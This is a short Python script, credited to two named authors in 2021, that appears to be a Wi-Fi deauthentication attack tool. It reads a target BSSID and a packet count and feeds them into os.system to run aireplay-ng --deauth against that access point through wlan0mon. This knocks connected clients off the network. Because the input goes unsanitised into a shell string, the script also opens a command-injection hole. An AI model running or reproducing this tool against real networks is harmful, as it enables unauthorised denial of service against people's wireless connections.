import argparse
import os
from ddos_txt import deauth_txt
deauth_txt()
print("\n****************************************************************")
print("\n* Copyright of saai jeshwanth && nithesh, 2021 *")
print("\n****************************************************************")
def ddauth():
    bssid = input("enter the bssid :")
    count = input("enter no.of packet to send :")
    os.system(" aireplay-ng --deauth " + count + " -a " + bssid +  " wlan0mon ")
        
           
            
    

